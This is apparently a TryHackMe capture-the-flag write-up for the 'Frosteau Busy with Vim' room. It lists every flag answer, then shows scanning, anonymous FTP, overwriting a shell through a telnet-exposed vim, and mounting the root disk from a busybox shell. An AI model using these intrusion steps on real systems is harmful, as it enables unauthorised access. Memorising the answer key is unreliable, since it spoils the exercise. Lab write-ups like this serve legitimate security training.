# Frosteau Busy with Vim
## https://tryhackme.com/jr/busyvimfrosteau
### 10.10.169.151

+ What is the value of the first flag?`THM{Let.the.game.begin}`
+ What is the value of the second flag?`THM{Seems.like.we.are.getting.busy}`
+ What is the value of the third flag?`THM{Not.all.roots.and.routes.are.equal}`
+ What is the value of the fourth flag?`THM{Frosteau.would.be.both.proud.and.disappointed}`
+ What is the value of the third Yetikey that has been placed in the root directory to verify the compromise?`3-d2dc6a02db03401177f0511a6c99007e945d9cb9b96b8c6294f8c5a2c8e01f60`

### RECONNAISE
+ Scan the machine using `nmap -sT -p- $IP`
    ```bash
    root@ip-10-10-98-127:~# nmap -sT -p- 10.10.169.151

    Starting Nmap 7.60 ( https://nmap.org ) at 2023-12-30 05:31 GMT
    Nmap scan report for ip-10-10-169-151.eu-west-1.compute.internal (10.10.169.151)
    Host is up (0.00033s latency).
    Not shown: 65529 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    8065/tcp open  unknown
    8075/tcp open  unknown
    8085/tcp open  unknown
    8095/tcp open  unknown
    MAC Address: 02:19:40:CE:0C:39 (Unknown)

    Nmap done: 1 IP address (1 host up) scanned in 2.31 seconds
    ```
+ Re-scan using script `nmap -sC -sV -p 22,80,8065,8075,8085,8095 10.10.169.151 > nmap_log`

+ Using telnet :
    ```
    root@ip-10-10-98-127:~# telnet 10.10.169.151 8065 
    Trying 10.10.169.151...
    Connected to 10.10.169.151.
    Escape character is '^]'.

    Ubuntu 22.04.3 LTS
    Connection closed by foreign host.


    root@ip-10-10-98-127:~# telnet 10.10.169.151 8075
    Trying 10.10.169.151...
    Connected to 10.10.169.151.
    Escape character is '^]'.
    220 Operation successful

    root@ip-10-10-98-127:~# ftp $IP 8075
    Connected to 10.10.169.151.
    220 Operation successful
    Name (10.10.169.151:root): anonymous
    230 Operation successful
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    200 Operation successful
    150 Directory listing
    total 8132
    -rw-r--r--    1 0        0             3010 Nov  5 18:49 FROST-2247-SP.txt
    -rw-r--r--    1 0        0             3211 Nov  5 18:50 YETI-1125-SP.txt
    -rw-r--r--    1 0        0               24 Nov  5 19:06 flag-1-of-4.txt
    -rw-r--r--    1 0        0               12 Nov  5 19:07 flag-2-of-4.sh
    -rw-r--r--    1 0        0          2127524 Nov  5 18:54 frostling_base.png
    -rw-r--r--    1 0        0          2305908 Nov  5 18:54 frostling_five.png
    -rw-r--r--    1 0        0          1589463 Nov  5 18:54 yeti_footage.png
    -rw-r--r--    1 0        0          2277409 Nov  5 18:54 yeti_mugshot.png

    ftp> get flag-1-of-4.txt
    local: flag-1-of-4.txt remote: flag-1-of-4.txt
    200 Operation successful
    150 Opening BINARY connection for flag-1-of-4.txt (24 bytes)
    226 Operation successful
    24 bytes received in 0.00 secs (275.7353 kB/s)


    ftp> get flag-2-of-4.sh
    local: flag-2-of-4.sh remote: flag-2-of-4.sh
    200 Operation successful
    150 Opening BINARY connection for flag-2-of-4.sh (12 bytes)
    226 Operation successful
    12 bytes received in 0.00 secs (234.3750 kB/s)

    root@ip-10-10-98-127:~# cat flag-1-of-4.txt 
    THM{Let.the.game.begin}

    $ $FLAG2
    /tmp/sh: 4: THM{Seems.like.we.are.getting.busy}: not found

    / # bb cat /mnt/root/*.txt 
    THM{Frosteau.would.be.both.proud.and.disappointed}
    3-d2dc6a02db03401177f0511a6c99007e945d9cb9b96b8c6294f8c5a2c8e01f60
    ```
### EXPLOIT 
+ Using telnet to modyfied the sh
    - `telnet 10.10.169.151 8085` will open vim 
    - `:e /usr/frosty/sh` to edit file on that location and press `i` to insert mode and add this `#!/etc/file/busybox` after add that line pres `esc` to out of edit mode and type `:w! /usr/frosty/sh` to write (save)
+ using telnet to got shell
    - `telnet 10.10.169.151 8065` and now we got the shell 
    - `/ # alias bb=/etc/busybox` to use busybox 

### PRIVILEDGE ESCALATION
    - Use our alias 
    ```bash
    / # bb mount -o rw /dev/xvda1 /mnt
    / # bb ls /mnt
    bin         dev         home        lib32       libx32      media       opt         root        sbin        srv         tmp         var
    boot        etc         lib         lib64       lost+found  mnt         proc        run         snap        sys         usr
    / # bb ls /mnt/root
    flag-4-of-4.txt  snap             yetikey3.txt
    / # bb cat /mnt/root/flag-4-of-4.txt 
    THM{Frosteau.would.be.both.proud.and.disappointed}
    / # bb cat /mnt/root/*.txt 
    THM{Frosteau.would.be.both.proud.and.disappointed}
    3-d2dc6a02db03401177f0511a6c99007e945d9cb9b96b8c6294f8c5a2c8e01f60
    / # 
    ```






